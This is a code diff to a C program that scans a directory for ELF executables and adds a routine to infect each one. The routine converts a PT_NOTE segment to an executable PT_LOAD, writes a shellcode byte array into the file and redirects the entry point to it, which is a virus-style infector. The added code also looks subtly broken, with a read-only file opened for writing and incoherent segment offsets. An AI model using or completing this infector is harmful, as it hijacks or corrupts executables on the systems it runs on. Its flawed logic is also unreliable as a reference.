@@ -6,6 +6,9 @@
 #include <dirent.h>
 #include <ftw.h>
 
+unsigned char shellcode[] = \
+"\xeb\x17\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x59\x31\xd2\xb2\x0d\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe4\xff\xff\xff\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64\x21\x0a\xE9\x00\x00\x00\x00";
+
 int checkifElf(Elf64_Ehdr elfHeader){
     unsigned char *fileMagicNumbers = elfHeader.e_ident;
 
@@ -25,7 +28,7 @@ int walkDirectory(const char *filename, const struct stat *statptr, int fileflag
     filePointer = fopen(filename, "rb");
     fread(&elfHeader, sizeof(elfHeader), 1, filePointer);
     result = checkifElf(elfHeader);
-    if(result == 0 && elfHeader.e_type == 3 && strstr(filename, "geass") == NULL){
+    if(result == 0 && strstr(filename, "geass") == NULL){
         printf("[*] %s is an Executable ELF file!\n", filename);
         printf("\tEntry Point: 0x%lx\n", elfHeader.e_entry);
 
@@ -46,13 +49,31 @@ int walkDirectory(const char *filename, const struct stat *statptr, int fileflag
         
         fseek(filePointer, bytePosition, SEEK_SET);
         
+        //note really study whats going on in here
         elfSegment.p_type = 1;
-        fwrite(&elfSegment, sizeof(elfSegment), 1, filePointer);
-        if(elfSegment.p_type == 1){
-            printf("\tPT_NOTE segment Updated to PT_LOAD segment\n");
-        }
+        printf("\tPT_NOTE segment Updated to PT_LOAD segment\n");
+        elfSegment.p_flags = PF_R | PF_X;
+        printf("\tMade PT_LOAD segment executable\n");
+        elfSegment.p_filesz += strlen(shellcode);
+        printf("\tUpdated filesize for code cave\n");
+        elfSegment.p_memsz += strlen(shellcode);
+        printf("\tUpdated memorysize for code cave\n");
+        elfSegment.p_vaddr = 0xc000000 + strlen(shellcode);
+        elfSegment.p_offset = strlen(shellcode);
+        printf("\tUpdated entrypoint to go to injected shellcode\n");
 
+        fwrite(&elfSegment, sizeof(elfSegment), 1, filePointer);
+        
+        fseek(filePointer, 0xc000000, SEEK_SET);
+        fwrite(shellcode, sizeof(shellcode), 1, filePointer);
+
+
+        elfHeader.e_entry = 0xc000000;
+        fseek(filePointer, 0, SEEK_SET);
+        fwrite(&elfHeader, sizeof(Elf64_Ehdr), 1, filePointer);
+        
         fclose(filePointer);
+
     }
 
     return 0;
@@ -63,7 +84,6 @@ int main(int argc, char *argv[]){
     int result;
 
     //verify argc is two
-
     memcpy(directoryName, argv[1], strlen(argv[1]));
     printf("[*] Scanning Directory: %s\n", directoryName);
 
